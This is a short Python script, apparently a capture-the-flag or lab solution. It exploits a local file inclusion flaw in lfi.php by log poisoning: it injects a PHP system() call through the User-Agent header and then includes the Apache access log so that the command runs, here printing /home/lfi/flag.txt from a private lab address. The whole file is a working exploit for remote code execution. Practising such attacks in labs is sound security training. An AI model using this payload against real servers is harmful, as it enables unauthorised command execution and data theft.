import requests


r=requests.get('http://10.10.34.54/lfi/lfi.php?page=/var/log/apache2/access.log',headers={"User-Agent":"<?php system('cat /home/lfi/flag.txt'); ?>"})

print(r.text)